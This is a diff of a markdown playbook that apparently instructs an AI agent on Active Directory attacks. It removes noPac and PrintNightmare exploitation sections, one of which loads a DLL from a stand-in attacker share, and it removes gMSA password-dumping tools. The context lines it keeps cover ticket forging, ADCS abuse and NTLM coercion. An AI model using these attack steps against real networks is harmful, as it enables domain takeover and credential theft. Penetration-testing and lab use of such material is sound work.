@@ -92,11 +92,6 @@ If you find yourself calling documentation tools more than attack tools, STOP an
    - Impersonation
    - Linked servers
 
-4. **CVE Exploitation**
-   - noPac
-   - PrintNightmare
-   - Other CVEs
-
 ## ADCS Exploitation (Priority)
 
 ### ESC1 - Enrollee Supplies Subject
@@ -360,28 +355,6 @@ If raise_child fails, manually forge ticket with Enterprise Admin SID:
 **Note:** Silver ticket forging is done using impacket's ticketer.py directly if needed.
 Golden ticket is preferred for persistence after obtaining krbtgt hash.
 
-## CVE Exploitation
-
-### noPac (CVE-2021-42278/42287)
-```
-nopac(
-    target_dc="dc01.contoso.local",
-    domain="contoso.local",
-    username="user",
-    password="pass"
-)
-→ Get Administrator access
-```
-
-### PrintNightmare
-```
-printnightmare(
-    target="server.contoso.local",
-    dll_path="\\\\attacker\\share\\evil.dll"
-)
-→ SYSTEM access on target
-```
-
 ## Local Privilege Escalation
 
 When you have a shell but need SYSTEM (e.g., SeImpersonatePrivilege):
@@ -463,7 +436,6 @@ For local privilege escalation via RBCD (requires ability to add computer):
 | rbcd_write | Write RBCD delegation |
 | add_computer | Add machine account for RBCD |
 | unconstrained_tgt_dump | Dump TGTs from unconstrained delegation |
-| unconstrained_coerce_and_capture | Coerce and capture TGT |
 
 ### MSSQL Tools
 | Tool | Use Case |
@@ -476,18 +448,6 @@ For local privilege escalation via RBCD (requires ability to add computer):
 | mssql_impersonate | Execute as another SQL user (use enum results) |
 | mssql_ntlm_coerce | Force NTLM auth for relay attacks |
 
-### CVE Tools
-| Tool | Use Case |
-|------|----------|
-| noPac | noPac vulnerability |
-| PrintNightmare | PrintNightmare |
-
-### CVE Exploit Tools
-| Tool | Use Case |
-|------|----------|
-| nopac | CVE-2021-42278/42287 - samAccountName spoofing |
-| printnightmare | CVE-2021-1675 - PrintNightmare RCE |
-
 ### Ticket Forging Tools
 | Tool | Use Case |
 |------|----------|
@@ -496,12 +456,6 @@ For local privilege escalation via RBCD (requires ability to add computer):
 | raise_child | Child-to-parent domain escalation |
 | extract_trust_key | Extract inter-realm trust key |
 | create_inter_realm_ticket | Forge inter-realm TGT |
-
-### gMSA Tools
-| Tool | Use Case |
-|------|----------|
-| gmsa_dump_passwords | Dump gMSA passwords (gMSADumper) |
-| gmsa_read_password_bloodyad | Read gMSA password (bloodyAD) |
 
 ## Reporting Results
 
